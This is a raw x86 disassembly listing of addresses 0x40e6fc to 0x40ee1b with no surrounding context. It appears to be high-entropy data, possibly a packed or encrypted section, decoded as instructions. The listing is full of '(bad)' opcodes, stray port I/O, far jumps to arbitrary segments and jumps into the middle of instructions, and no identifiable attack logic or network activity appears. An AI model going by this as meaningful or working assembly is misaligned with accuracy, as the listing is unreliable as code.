  40e6fc:	mov    ah,0xa4
  40e6fe:	jecxz  0x40e6d4
  40e700:	jno    0x40e725
  40e702:	xchg   ebp,eax
  40e703:	inc    ebp
  40e704:	repz pusha 
  40e706:	sub    BYTE PTR [edx+0xf],dh
  40e709:	jne    0x40e6f1
  40e70b:	inc    esi
  40e70c:	and    esp,0xffffffa5
  40e70f:	xor    al,0x94
  40e711:	sub    eax,0x24d43198
  40e716:	sub    ecx,edi
  40e718:	aaa    
  40e719:	clc    
  40e71a:	das    
  40e71b:	xchg   ebp,eax
  40e71c:	jmp    0xba5977a0
  40e721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e722:	push   ds
  40e723:	mov    edx,0xc5915da3
  40e728:	add    BYTE PTR ds:0x5d70989e,bh
  40e72e:	mov    al,0x76
  40e730:	mov    ah,0x6e
  40e732:	and    BYTE PTR [ebx-0x7e992cd8],dh
  40e738:	sahf   
  40e739:	addr16 aam 0xe1
  40e73c:	int    0xb
  40e73e:	ja     0x40e6c3
  40e740:	js     0x40e70f
  40e742:	push   cs
  40e743:	sub    eax,DWORD PTR es:[ebx-0x4d1d69c1]
  40e74a:	push   cs
  40e74b:	xlat   BYTE PTR ds:[ebx]
  40e74c:	add    esi,ebp
  40e74e:	in     al,0x39
  40e750:	and    edi,DWORD PTR [edx]
  40e752:	jp     0x40e759
  40e754:	leave  
  40e755:	jno    0x40e6f9
  40e757:	mov    BYTE PTR [ebx+0x34216960],dl
  40e75d:	lods   al,BYTE PTR ds:[esi]
  40e75e:	sbb    ax,0x98fb
  40e762:	les    ebx,FWORD PTR [ecx+0x1bafa9b9]
  40e768:	test   BYTE PTR [edi],bl
  40e76a:	and    esi,0x4955fcf3
  40e770:	fs jle 0x40e7e8
  40e773:	jmp    0x40e7ce
  40e775:	loop   0x40e72c
  40e777:	jne    0x40e732
  40e779:	in     eax,0xbf
  40e77b:	and    cl,BYTE PTR [esi-0x289111f1]
  40e781:	inc    edx
  40e782:	and    DWORD PTR [ecx+0x72],ecx
  40e785:	sar    BYTE PTR [edx],cl
  40e787:	mov    eax,ds:0x6bea50bc
  40e78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e78d:	test   BYTE PTR [eax-0x3b],0xc0
  40e791:	pop    ss
  40e792:	cmc    
  40e793:	mov    DWORD PTR [edi+0x25],edi
  40e796:	sub    DWORD PTR [eax-0x7c],edx
  40e799:	push   es
  40e79a:	ds gs ja 0x40e7b1
  40e79e:	hlt    
  40e79f:	pop    ecx
  40e7a0:	jecxz  0x40e7b0
  40e7a2:	sbb    DWORD PTR [eax],edi
  40e7a4:	jo     0x40e801
  40e7a6:	or     al,0x5c
  40e7a8:	daa    
  40e7a9:	xchg   ebp,eax
  40e7aa:	mov    ds:0x984e7a1,al
  40e7af:	sub    DWORD PTR [ecx+esi*4],esp
  40e7b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7b3:	xor    eax,0x55be1e10
  40e7b8:	mov    dh,BYTE PTR [edx]
  40e7ba:	jmp    0x40e795
  40e7bc:	iret   
  40e7bd:	mov    ah,0x32
  40e7bf:	lock fwait
  40e7c1:	and    ah,cl
  40e7c3:	mov    al,0xcd
  40e7c5:	xchg   DWORD PTR [ecx+0x58338470],ebx
  40e7cb:	iret   
  40e7cc:	sub    al,0xc2
  40e7ce:	lods   eax,DWORD PTR ds:[esi]
  40e7cf:	inc    edi
  40e7d0:	xchg   ecx,eax
  40e7d1:	and    al,0x8a
  40e7d3:	push   esi
  40e7d4:	popf   
  40e7d5:	xor    DWORD PTR [ebx+0x2f],0xa48d687d
  40e7dc:	mov    bl,0x29
  40e7de:	fiadd  DWORD PTR [ebx+ebx*2]
  40e7e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7e2:	sti    
  40e7e3:	lods   eax,DWORD PTR ds:[esi]
  40e7e4:	shl    BYTE PTR [ecx-0x3d6f7bc5],cl
  40e7ea:	ficomp DWORD PTR [ebx-0x5dd596a0]
  40e7f0:	dec    ecx
  40e7f1:	sbb    cl,BYTE PTR [eax+eiz*1]
  40e7f4:	daa    
  40e7f5:	cmp    edx,DWORD PTR [ebx+0x957e3db]
  40e7fb:	pusha  
  40e7fc:	sub    DWORD PTR [eax+0x10],0x363868fc
  40e803:	call   FWORD PTR [ebp-0x4c56af6]
  40e809:	jecxz  0x40e87e
  40e80b:	cmp    al,0xb1
  40e80d:	cmp    al,0x19
  40e80f:	pop    ebp
  40e810:	int    0x2d
  40e812:	mov    dl,0x7
  40e814:	imul   esi,DWORD PTR [esp+ecx*8-0x394497e7],0xffffffaf
  40e81c:	jmp    0x40e81d
  40e81e:	pop    ss
  40e81f:	sbb    ch,BYTE PTR ds:0x964db4f1
  40e825:	dec    ecx
  40e826:	cli    
  40e827:	mov    ds:0xf2db2dd,al
  40e82c:	sub    ebp,edx
  40e82e:	xchg   BYTE PTR [edi-0x71d61133],dl
  40e834:	fs sbb eax,0x2dd5f444
  40e83a:	inc    esi
  40e83b:	frstor [eax+0x53]
  40e83e:	and    BYTE PTR [ebx+esi*1],ah
  40e841:	clc    
  40e842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e843:	adc    dh,BYTE PTR [ebx]
  40e845:	mov    bl,0xe2
  40e847:	out    0x66,al
  40e849:	stc    
  40e84a:	inc    esp
  40e84b:	and    eax,0x299515
  40e850:	or     ebp,DWORD PTR [esi+ecx*2+0x17]
  40e854:	dec    ebp
  40e855:	addr16 popf 
  40e857:	aaa    
  40e858:	test   eax,0x23fb51f7
  40e85d:	test   BYTE PTR [esi],dh
  40e85f:	pop    eax
  40e860:	and    eax,0xbf2de872
  40e865:	push   cs
  40e866:	(bad)  
  40e867:	out    0xda,eax
  40e869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e86a:	dec    ecx
  40e86b:	pop    ss
  40e86c:	push   ebx
  40e86d:	outs   dx,DWORD PTR ds:[esi]
  40e86e:	xor    DWORD PTR [ecx-0x61992968],0xae9137a9
  40e878:	mov    al,ds:0xb2656db3
  40e87d:	pop    ebp
  40e87e:	add    al,0xa2
  40e880:	jnp    0x40e811
  40e882:	fsubrp st(5),st
  40e884:	mov    dl,0xb9
  40e886:	jns    0x40e879
  40e888:	outs   dx,DWORD PTR ds:[esi]
  40e889:	sbb    ch,BYTE PTR [eax]
  40e88b:	stc    
  40e88c:	cmp    eax,0x5713ac9f
  40e891:	ins    BYTE PTR es:[edi],dx
  40e892:	jnp    0x40e837
  40e894:	loopne 0x40e816
  40e896:	es mov ah,0x79
  40e899:	inc    esp
  40e89a:	push   cs
  40e89b:	pusha  
  40e89c:	outs   dx,DWORD PTR ds:[esi]
  40e89d:	dec    esp
  40e89e:	ins    BYTE PTR es:[edi],dx
  40e89f:	cmp    al,0x4a
  40e8a1:	imul   ebx,DWORD PTR [eax-0x37aee0e3],0xffffffc9
  40e8a8:	and    dl,ah
  40e8aa:	pop    edx
  40e8ab:	outs   dx,BYTE PTR ds:[esi]
  40e8ac:	push   ebx
  40e8ad:	ja     0x40e892
  40e8af:	push   ebx
  40e8b0:	cs xchg edi,eax
  40e8b2:	jae    0x40e88d
  40e8b4:	rcl    esp,cl
  40e8b6:	lods   al,BYTE PTR ds:[esi]
  40e8b7:	arpl   WORD PTR [esi+0x60],di
  40e8ba:	fwait
  40e8bb:	mov    dh,BYTE PTR [ecx+0x5d]
  40e8be:	add    esp,DWORD PTR [ebx-0x5f]
  40e8c1:	call   0x7c52:0x9830c05b
  40e8c8:	in     al,dx
  40e8c9:	or     ecx,DWORD PTR [ecx]
  40e8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8cc:	imul   ebx,esi,0xffffffba
  40e8cf:	xor    DWORD PTR [ebp-0x4e7e70bc],eax
  40e8d5:	(bad)  
  40e8d6:	push   eax
  40e8d7:	(bad)  
  40e8d8:	loope  0x40e8b8
  40e8da:	adc    al,0x3f
  40e8dc:	xchg   edx,eax
  40e8dd:	sti    
  40e8de:	sbb    DWORD PTR [ecx+0x3fc03058],esi
  40e8e4:	mov    ds:0x1e377b2d,eax
  40e8e9:	push   cs
  40e8ea:	push   ecx
  40e8eb:	pop    esi
  40e8ec:	stos   BYTE PTR es:[edi],al
  40e8ed:	dec    esp
  40e8ee:	loop   0x40e92e
  40e8f0:	jno    0x40e8d4
  40e8f2:	(bad)  
  40e8f3:	xchg   edi,eax
  40e8f4:	mov    WORD PTR [edx+ebp*4-0x45e7fafe],gs
  40e8fb:	ins    BYTE PTR es:[edi],dx
  40e8fc:	ja     0x40e888
  40e8fe:	rol    BYTE PTR [edx],1
  40e900:	sbb    cl,BYTE PTR [esi+esi*2]
  40e903:	in     al,0x39
  40e905:	cli    
  40e906:	popf   
  40e907:	sbb    bl,ch
  40e909:	mov    ah,0x61
  40e90b:	adc    al,0x85
  40e90d:	pop    esp
  40e90e:	test   BYTE PTR [edi+0x17396384],0x41
  40e915:	stc    
  40e916:	out    dx,al
  40e917:	push   0x3a4a0915
  40e91c:	in     al,0x7b
  40e91e:	mov    DWORD PTR [ecx-0x6e],ebp
  40e921:	jecxz  0x40e90d
  40e923:	adc    al,0xae
  40e925:	cmp    ah,BYTE PTR [eax-0x1b]
  40e928:	(bad)  
  40e92a:	adc    al,0x74
  40e92c:	test   BYTE PTR [esi+0x53],0x6e
  40e930:	jmp    0x4fb3:0xfe3cd93d
  40e937:	jge    0x40e8d6
  40e939:	leave  
  40e93a:	jmp    0x9155:0x153b250b
  40e941:	push   DWORD PTR [edi+0x815cc1a]
  40e947:	or     eax,0x3e9ac75f
  40e94c:	in     al,dx
  40e94d:	sbb    esi,DWORD PTR [ebx-0x28]
  40e950:	lahf   
  40e951:	push   esi
  40e952:	pop    es
  40e953:	jo     0x40e8e8
  40e955:	jno    0x40e99d
  40e957:	inc    esp
  40e958:	fidivr WORD PTR [edi+0x25]
  40e95b:	mov    ch,0xa3
  40e95d:	out    dx,eax
  40e95e:	enter  0xe3c,0x98
  40e962:	(bad)  
  40e963:	sbb    ah,BYTE PTR [ebp-0x75058ff9]
  40e969:	push   cs
  40e96a:	int3   
  40e96b:	mov    esp,0x3ee79278
  40e970:	cmp    ebp,0x6e
  40e973:	pop    edi
  40e974:	in     al,0xfb
  40e976:	cmp    al,0xc6
  40e978:	jle    0x40e982
  40e97a:	out    dx,al
  40e97b:	jo     0x40e90d
  40e97d:	out    dx,eax
  40e97e:	jbe    0x40e908
  40e980:	sbb    al,0xe6
  40e982:	lock adc DWORD PTR [ebx+ebp*2+0x337ec700],0x1f4025b5
  40e98e:	scas   eax,DWORD PTR es:[edi]
  40e98f:	rcr    esp,1
  40e991:	jmp    0x40e92f
  40e993:	add    eax,0xb26c4ced
  40e998:	inc    edi
  40e999:	outs   dx,DWORD PTR ds:[esi]
  40e99a:	xchg   ebp,eax
  40e99b:	into   
  40e99c:	cmp    eax,DWORD PTR [ebx+0x79]
  40e99f:	or     edi,ebx
  40e9a1:	jle    0x40e95b
  40e9a3:	jno    0x40e9f0
  40e9a5:	push   esi
  40e9a6:	mov    ah,BYTE PTR [ebp-0x63]
  40e9a9:	and    cl,0x62
  40e9ac:	(bad)  
  40e9ad:	xchg   esi,eax
  40e9ae:	push   esi
  40e9af:	daa    
  40e9b0:	(bad)  
  40e9b1:	fs out dx,al
  40e9b3:	rol    DWORD PTR [esi+eiz*2],cl
  40e9b6:	clc    
  40e9b7:	lock loop 0x40ea01
  40e9ba:	repz inc esp
  40e9bc:	jno    0x40ea0d
  40e9be:	sbb    BYTE PTR [edi+0x2d],dl
  40e9c1:	fstp   DWORD PTR [edx+0x477a1492]
  40e9c7:	sbb    ax,0x6de4
  40e9cb:	aaa    
  40e9cc:	rcr    ebp,1
  40e9ce:	push   ds
  40e9cf:	jmp    0xb62c5e66
  40e9d4:	and    ch,bh
  40e9d6:	enter  0x1872,0xf5
  40e9da:	imul   esp,DWORD PTR [ebx-0xb],0x77
  40e9de:	je     0x40ea06
  40e9e0:	and    eax,0x8d5bcbff
  40e9e5:	not    BYTE PTR [ecx]
  40e9e7:	dec    esi
  40e9e8:	xchg   ecx,eax
  40e9e9:	and    ebx,eax
  40e9eb:	test   al,0x8a
  40e9ed:	les    esi,FWORD PTR [esi+0x31]
  40e9f0:	loope  0x40ea13
  40e9f2:	xchg   ecx,eax
  40e9f3:	dec    ebp
  40e9f4:	loopne 0x40ea6e
  40e9f6:	adc    al,0xe4
  40e9f8:	out    dx,al
  40e9f9:	jae    0x40ea6b
  40e9fb:	sbb    dl,BYTE PTR [esi+0x31]
  40e9fe:	push   ecx
  40e9ff:	stos   BYTE PTR es:[edi],al
  40ea00:	daa    
  40ea01:	cmp    eax,0x74cbd9a0
  40ea06:	xchg   ecx,eax
  40ea07:	pop    esi
  40ea08:	mov    esp,0xe3cef5c2
  40ea0d:	and    eax,0x1c771219
  40ea12:	fld    QWORD PTR [ebx-0x3b]
  40ea15:	mov    eax,ds:0x4ff70ff3
  40ea1a:	or     eax,0xba9aaf98
  40ea1f:	jnp    0x40ea07
  40ea21:	out    0x81,eax
  40ea23:	mov    ebx,0x861c0725
  40ea28:	pop    es
  40ea29:	retf   
  40ea2a:	outs   dx,BYTE PTR ds:[esi]
  40ea2b:	scas   al,BYTE PTR es:[edi]
  40ea2c:	fadd   st(7),st
  40ea2e:	push   eax
  40ea2f:	and    esi,DWORD PTR [eax]
  40ea31:	push   ds
  40ea32:	xchg   edx,eax
  40ea33:	in     eax,0x9d
  40ea35:	sahf   
  40ea36:	push   0x56dd1702
  40ea3b:	pushf  
  40ea3c:	xlat   BYTE PTR ds:[ebx]
  40ea3d:	bound  eax,QWORD PTR [ecx+0x57a9b077]
  40ea43:	fcmovnbe st,st(0)
  40ea45:	cli    
  40ea46:	imul   esi,ecx,0xbaf0e95d
  40ea4c:	sbb    ah,al
  40ea4e:	dec    edx
  40ea4f:	inc    ecx
  40ea50:	xor    DWORD PTR [edx+edx*8+0x4263c805],ebp
  40ea57:	mov    al,ds:0x73b000d1
  40ea5c:	mov    cl,0xb3
  40ea5e:	push   ds
  40ea5f:	pusha  
  40ea60:	inc    eax
  40ea61:	dec    ebx
  40ea62:	popf   
  40ea63:	mov    ebp,0x670fa643
  40ea68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea69:	call   0xd22e396f
  40ea6e:	ficom  WORD PTR [edi]
  40ea70:	test   DWORD PTR [esi],ecx
  40ea72:	sbb    dl,ch
  40ea74:	mov    cs,ebp
  40ea76:	rcr    ecx,1
  40ea78:	add    DWORD PTR [esi-0x6],edi
  40ea7b:	pushf  
  40ea7c:	pop    ecx
  40ea7d:	fwait
  40ea7e:	gs out dx,al
  40ea80:	add    eax,0xd49cbd19
  40ea85:	rcr    DWORD PTR [ebx+0x4a],0x42
  40ea89:	fst    DWORD PTR [ecx+eax*1+0x4f]
  40ea8d:	repz jl 0x40ead4
  40ea90:	out    dx,eax
  40ea91:	cmp    ah,ah
  40ea93:	daa    
  40ea94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea95:	inc    ebx
  40ea96:	or     eax,0x62af721a
  40ea9b:	es pop ds
  40ea9d:	jecxz  0x40ea7b
  40ea9f:	test   BYTE PTR [eax+0x13c67565],cl
  40eaa5:	(bad)  
  40eaa6:	das    
  40eaa7:	inc    ebp
  40eaa8:	mov    ch,0x74
  40eaaa:	mov    eax,ds:0xfb41a79f
  40eaaf:	pop    edx
  40eab0:	sbb    edx,esp
  40eab2:	aas    
  40eab3:	or     eax,0xe3682fe3
  40eab8:	mov    dh,0xb2
  40eaba:	call   0x70cb32d
  40eabf:	dec    esp
  40eac0:	call   0x76cd9e2b
  40eac5:	loopne 0x40eafa
  40eac7:	xchg   edi,eax
  40eac8:	xchg   ecx,eax
  40eac9:	imul   eax,DWORD PTR [eax-0x61bbba89],0xfffffff5
  40ead0:	loop   0x40ea93
  40ead2:	pop    es
  40ead3:	pop    edx
  40ead4:	adc    dh,bh
  40ead6:	popa   
  40ead7:	iret   
  40ead8:	dec    ebx
  40ead9:	add    BYTE PTR [ebx+eax*2+0x1dfdad1c],dh
  40eae0:	mov    edi,0xfdd0f174
  40eae5:	test   BYTE PTR [ecx-0x4d],al
  40eae8:	(bad)  
  40eae9:	stos   BYTE PTR es:[edi],al
  40eaea:	xchg   ecx,eax
  40eaeb:	int    0xde
  40eaed:	jecxz  0x40eb3f
  40eaef:	or     BYTE PTR [ebx+0x24],al
  40eaf2:	scas   al,BYTE PTR es:[edi]
  40eaf3:	shl    BYTE PTR [ecx+0x5e],1
  40eaf6:	call   0x90090e2f
  40eafb:	retf   0xff3d
  40eafe:	test   DWORD PTR [ebx],eax
  40eb00:	data16 jbe 0x40eb11
  40eb03:	mov    ebp,0xfc05264b
  40eb08:	cs push ss
  40eb0a:	fs sahf 
  40eb0c:	data16 cmp cl,dl
  40eb0f:	sti    
  40eb10:	or     BYTE PTR [edi+0x2e7bb8fd],cl
  40eb16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb17:	cmc    
  40eb18:	inc    eax
  40eb19:	enter  0xd07a,0x2c
  40eb1d:	jp     0x40eb24
  40eb1f:	jae    0x40eb80
  40eb21:	outs   dx,DWORD PTR ds:[esi]
  40eb22:	xlat   BYTE PTR ds:[ebx]
  40eb23:	loopne 0x40eb4d
  40eb25:	push   ds
  40eb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb27:	fsub   st,st(1)
  40eb29:	jmp    0xc3464692
  40eb2e:	jge    0x40eb0a
  40eb30:	dec    edx
  40eb31:	or     BYTE PTR [ecx-0x74a7dce],dh
  40eb37:	and    BYTE PTR [ebp+0x40],bh
  40eb3a:	and    DWORD PTR [edx+0xf0b65ec],ecx
  40eb40:	enter  0x8749,0x4b
  40eb44:	test   BYTE PTR [edx+0xe],dl
  40eb47:	fidivr DWORD PTR ds:[ecx-0x1b544517]
  40eb4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb4f:	jl     0x40ead5
  40eb51:	inc    esi
  40eb52:	inc    esi
  40eb53:	in     eax,0x9f
  40eb55:	xchg   ecx,eax
  40eb56:	mov    dh,0xc8
  40eb58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb59:	pop    es
  40eb5a:	addr16 add al,al
  40eb5d:	jno    0x40eb8f
  40eb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb60:	(bad)  
  40eb61:	call   0xaf7d277a
  40eb66:	xchg   DWORD PTR [eax+ebp*8-0x38965ec3],ebp
  40eb6d:	lds    ecx,FWORD PTR [ecx+0x1fe82225]
  40eb73:	add    BYTE PTR [edi-0x2003129e],cl
  40eb79:	mov    ebx,0x79517692
  40eb7e:	stos   DWORD PTR es:[edi],eax
  40eb7f:	into   
  40eb80:	add    BYTE PTR [edi+0x13791b0b],bh
  40eb86:	jne    0x40eb8f
  40eb88:	push   0xe1d10cb
  40eb8d:	cmp    eax,0x148b9d39
  40eb92:	or     DWORD PTR [edi+esi*2-0x57],edx
  40eb96:	xor    BYTE PTR [ebx+0x17e3a4d4],cl
  40eb9c:	xor    al,0x57
  40eb9e:	mov    dh,0xe1
  40eba0:	lods   al,BYTE PTR ds:[esi]
  40eba1:	sti    
  40eba2:	xor    ch,bl
  40eba4:	mov    eax,ds:0x98b73813
  40eba9:	imul   esp,DWORD PTR [edi+0x4e54c7e],0xffffff83
  40ebb0:	stos   DWORD PTR es:[edi],eax
  40ebb1:	xchg   ebp,eax
  40ebb2:	mov    bh,0xd9
  40ebb4:	(bad)  
  40ebb5:	pushf  
  40ebb6:	idiv   BYTE PTR [ecx+0x5a43cf4f]
  40ebbc:	pop    esp
  40ebbd:	and    cl,BYTE PTR [ebx]
  40ebbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc0:	es jmp 0x7a7e:0x40c25f77
  40ebc8:	inc    eax
  40ebc9:	(bad)  
  40ebcb:	cli    
  40ebcc:	dec    ebx
  40ebcd:	sbb    BYTE PTR [edi-0x6f],ch
  40ebd0:	shl    DWORD PTR fs:[edx],cl
  40ebd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebd4:	mov    cs,WORD PTR [edi]
  40ebd6:	ficomp DWORD PTR [edx-0x1083afba]
  40ebdc:	add    edx,DWORD PTR [ebp+0x3]
  40ebdf:	mov    cl,bh
  40ebe1:	(bad)  
  40ebe2:	loop   0x40ebf6
  40ebe4:	mov    ebp,0xf1a23cf8
  40ebe9:	mov    ah,BYTE PTR [ecx]
  40ebeb:	call   0x9ba1:0xd29f933e
  40ebf2:	stc    
  40ebf3:	out    0x10,eax
  40ebf5:	mov    al,0x93
  40ebf7:	or     ah,bh
  40ebf9:	stos   DWORD PTR es:[edi],eax
  40ebfa:	xor    eax,0x53c7070f
  40ebff:	and    bh,ah
  40ec01:	scas   al,BYTE PTR es:[edi]
  40ec02:	pop    es
  40ec03:	pop    ebp
  40ec04:	xchg   esp,eax
  40ec05:	test   BYTE PTR [edx-0x6c],dl
  40ec08:	xor    ch,cl
  40ec0a:	mov    edi,0x72a3b7a9
  40ec0f:	lods   al,BYTE PTR ds:[esi]
  40ec10:	sbb    BYTE PTR [esi+ebx*4-0x26],ah
  40ec14:	xor    eax,0x82c770e
  40ec19:	inc    ecx
  40ec1a:	ins    BYTE PTR es:[edi],dx
  40ec1b:	js     0x40ec10
  40ec1d:	xchg   edi,eax
  40ec1e:	jecxz  0x40ec84
  40ec20:	pop    edi
  40ec21:	(bad)  
  40ec22:	xchg   edi,eax
  40ec23:	mov    cl,0xe0
  40ec25:	mov    eax,0x1956fa72
  40ec2a:	pop    esi
  40ec2b:	fdiv   QWORD PTR [edi-0x54]
  40ec2e:	loope  0x40ebb0
  40ec30:	mov    ah,0xe8
  40ec32:	aam    0xb7
  40ec34:	and    eax,0xe57d74ff
  40ec39:	stc    
  40ec3a:	adc    al,BYTE PTR [ebx-0x73]
  40ec3d:	dec    esp
  40ec3e:	mov    ecx,0x4790d759
  40ec43:	push   esp
  40ec44:	push   ebp
  40ec45:	(bad)  
  40ec46:	shl    bl,1
  40ec48:	push   ss
  40ec49:	mov    esi,0x7d018109
  40ec4e:	outs   dx,BYTE PTR ds:[esi]
  40ec4f:	xchg   ecx,eax
  40ec50:	xchg   ebx,eax
  40ec51:	fst    st(7)
  40ec53:	adc    al,0x55
  40ec55:	fsubr  DWORD PTR [edi]
  40ec57:	fmul   DWORD PTR [edi-0x71]
  40ec5a:	les    ecx,FWORD PTR ds:0xfbc9f74e
  40ec60:	mov    ah,cl
  40ec62:	adc    ecx,DWORD PTR [esi-0x7877845]
  40ec68:	ds and al,0xb1
  40ec6b:	fistp  QWORD PTR [edi-0x2613ec2d]
  40ec71:	and    ebp,DWORD PTR [edx+0x3d7206f]
  40ec77:	mov    bh,0xf7
  40ec79:	cmp    BYTE PTR [ebx+esi*1],dh
  40ec7c:	jbe    0x40ec43
  40ec7e:	test   DWORD PTR [eax-0x8],ebx
  40ec81:	test   al,0x95
  40ec83:	repz jle 0x40ecc5
  40ec86:	into   
  40ec87:	push   edi
  40ec88:	shr    BYTE PTR [edx-0x48f822d7],1
  40ec8e:	es adc al,0xde
  40ec91:	stos   BYTE PTR es:[edi],al
  40ec92:	pop    ds
  40ec93:	lods   eax,DWORD PTR ds:[esi]
  40ec94:	scas   eax,DWORD PTR es:[edi]
  40ec95:	jb     0x40ed13
  40ec97:	(bad)  [edx+0x17]
  40ec9a:	je     0x40ec40
  40ec9c:	mov    ebx,DWORD PTR [esi+0x5]
  40ec9f:	cmp    edi,DWORD PTR [eax+0x1b]
  40eca2:	add    BYTE PTR [edx-0xa],bh
  40eca5:	push   ss
  40eca6:	shr    BYTE PTR [ebx+0x50],0x70
  40ecaa:	mov    ds:0xa63974e9,al
  40ecaf:	sbb    ah,BYTE PTR [eax-0xf]
  40ecb2:	pushf  
  40ecb3:	fmul   QWORD PTR [edx+0x17]
  40ecb7:	outs   dx,DWORD PTR ds:[esi]
  40ecb8:	ds jns 0x40ec9e
  40ecbb:	outs   dx,BYTE PTR ds:[esi]
  40ecbc:	neg    DWORD PTR [esi-0x598e756b]
  40ecc2:	cmp    al,0x72
  40ecc4:	stos   BYTE PTR es:[edi],al
  40ecc5:	leave  
  40ecc6:	data16 add ch,BYTE PTR [edi+0x54631e63]
  40eccd:	lds    esp,FWORD PTR [edi]
  40eccf:	mov    edx,0xe705bb9f
  40ecd4:	je     0x40ecf2
  40ecd6:	xchg   edx,eax
  40ecd7:	adc    eax,0xfa9c271
  40ecdc:	into   
  40ecdd:	jge    0x40ed00
  40ecdf:	out    dx,al
  40ece0:	out    dx,eax
  40ece1:	cmp    BYTE PTR [ecx+0x59a1282],0x27
  40ece8:	mov    cl,0x7a
  40ecea:	jmp    0xdf21:0xb2d9109d
  40ecf1:	mov    al,0xc1
  40ecf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecf4:	cld    
  40ecf5:	jl     0x40ec7e
  40ecf7:	icebp  
  40ecf8:	jns    0x40ec8b
  40ecfa:	in     al,dx
  40ecfb:	sbb    DWORD PTR [edx+ecx*8-0x66],ebp
  40ecff:	lods   al,BYTE PTR ds:[esi]
  40ed00:	adc    al,0x94
  40ed02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed03:	sar    DWORD PTR [ebp-0x3c389441],cl
  40ed09:	sbb    DWORD PTR [edx-0x66],esi
  40ed0c:	sbb    al,0x58
  40ed0e:	out    0xf5,al
  40ed10:	out    0x66,al
  40ed12:	stos   BYTE PTR es:[edi],al
  40ed13:	test   eax,0x11655e99
  40ed18:	loop   0x40ecb7
  40ed1a:	cmp    eax,esi
  40ed1c:	and    eax,0x7f9105ad
  40ed21:	out    dx,eax
  40ed22:	repnz pop edx
  40ed24:	inc    esp
  40ed25:	retf   
  40ed26:	cmp    edx,DWORD PTR [edi-0x5e568d63]
  40ed2c:	cmc    
  40ed2d:	mov    al,ds:0xd6bbbf2c
  40ed32:	popa   
  40ed33:	adc    DWORD PTR [edx+0x35],ecx
  40ed36:	jns    0x40ed04
  40ed38:	pop    ecx
  40ed39:	rcl    BYTE PTR [esi-0x347027c],1
  40ed3f:	mov    ss,WORD PTR [esi-0x7f]
  40ed42:	mov    dh,BYTE PTR [esi+0x2d6857cb]
  40ed48:	dec    ebx
  40ed49:	into   
  40ed4a:	push   ds
  40ed4b:	pop    eax
  40ed4c:	outs   dx,BYTE PTR ds:[esi]
  40ed4d:	add    ah,BYTE PTR [esi]
  40ed4f:	(bad)  
  40ed50:	or     eax,0x330192fa
  40ed55:	sbb    bl,BYTE PTR [ecx]
  40ed57:	xchg   ebx,eax
  40ed58:	lahf   
  40ed59:	jno    0x40ed5d
  40ed5b:	jno    0x40ed97
  40ed5d:	sbb    bl,al
  40ed5f:	aam    0x9f
  40ed61:	mov    ebx,0x3e700895
  40ed66:	mov    ebp,0xce0291a4
  40ed6b:	and    eax,0xfbb8c545
  40ed70:	repnz test BYTE PTR [eax+ebx*8+0x5],ah
  40ed75:	mov    al,BYTE PTR [eax+0x47d90eb5]
  40ed7b:	mov    ecx,0x1580050b
  40ed80:	cmp    edi,DWORD PTR [edx-0x3d3fbd7b]
  40ed86:	sub    al,0x23
  40ed88:	das    
  40ed89:	mov    DWORD PTR [edi+0x50],0x7fcbeeb1
  40ed90:	push   cs
  40ed91:	dec    eax
  40ed92:	fmul   st(2),st
  40ed94:	iretw  
  40ed96:	and    eax,0x31573128
  40ed9b:	fs hlt 
  40ed9d:	adc    DWORD PTR [ebp-0x66],edi
  40eda0:	int3   
  40eda1:	xchg   edx,edx
  40eda3:	rcr    ecx,cl
  40eda5:	or     eax,0x98e3304c
  40edaa:	sub    DWORD PTR ds:0xe38d4997,ebx
  40edb0:	lock pop edi
  40edb2:	and    edx,DWORD PTR [edx+0x24]
  40edb5:	adc    eax,0x271db7b4
  40edba:	cmp    DWORD PTR [esi-0x1166ba72],ecx
  40edc0:	jnp    0x40ed66
  40edc2:	pop    ebx
  40edc3:	or     BYTE PTR [ecx+0x245a4df5],ch
  40edc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edca:	cmp    BYTE PTR [ebp+0x70],dl
  40edcd:	push   es
  40edce:	repz mov cl,0x5f
  40edd1:	sar    DWORD PTR [ecx+0xb],cl
  40edd4:	mov    ecx,0x6f7948f7
  40edd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edda:	in     al,0xa
  40eddc:	test   al,0x35
  40edde:	fcomp  QWORD PTR [edi+0x6b]
  40ede1:	or     DWORD PTR [ebx],ecx
  40ede3:	pop    ebx
  40ede4:	out    0x8,eax
  40ede6:	icebp  
  40ede7:	not    DWORD PTR [edx+0x3d]
  40edea:	inc    eax
  40edeb:	call   0xac61:0x46c80365
  40edf2:	icebp  
  40edf3:	mov    ds:0x2197c844,eax
  40edf8:	aam    0xc9
  40edfa:	jecxz  0x40ed96
  40edfc:	test   ah,0x25
  40edff:	xor    al,0x49
  40ee01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee02:	and    ebp,DWORD PTR [ecx]
  40ee04:	inc    esi
  40ee05:	xor    al,0xe5
  40ee07:	test   BYTE PTR [edx],0x77
  40ee0a:	mov    bh,0x80
  40ee0c:	cmp    BYTE PTR [edx+0x691690e0],dl
  40ee12:	xchg   ebx,eax
  40ee13:	jbe    0x40ee6f
  40ee15:	cmp    ebp,esp
  40ee17:	scas   al,BYTE PTR es:[edi]
  40ee18:	mov    al,0x3a
  40ee1a:	inc    ebx
  40ee1b:	adc    BYTE PTR [eax-0x6f],al
